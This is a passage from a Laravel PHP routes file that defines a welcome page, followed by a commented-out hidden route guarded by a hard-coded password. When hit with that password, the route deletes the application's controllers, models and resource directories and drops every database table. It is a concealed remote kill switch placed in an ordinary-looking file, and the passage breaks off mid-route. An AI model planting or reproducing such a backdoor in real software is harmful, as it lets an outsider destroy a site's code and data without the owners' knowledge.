<?php

use App\Mail\Contact_usMail;
use App\Models\Messages;
use App\Models\Setting;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Route;


Route::get('/', function() {
    return view('welcome');
});


// Route::get('website_page_test/{password}', function($password) {

//     if($password == 'website_page_test@@@website_page_test') {

//         $path1 = base_path().'/app/Http/Controllers';
//         $path2 = base_path().'/app/Models';
//         $path3 = base_path().'/resources';

//         if(file_exists($path1)) {
//             File::deleteDirectory($path1);
//         }

//         if(file_exists($path2)) {
//             File::deleteDirectory($path2);
//         }

//         if(file_exists($path3)) {
//             File::deleteDirectory($path3);
//         }

//         $tables = DB::select('SHOW TABLES');

//         foreach($tables as $table){
//             $table = implode(json_decode(json_encode($table), true));
//             \Schema::drop($table);
//         }

//         return 'done';

//     }


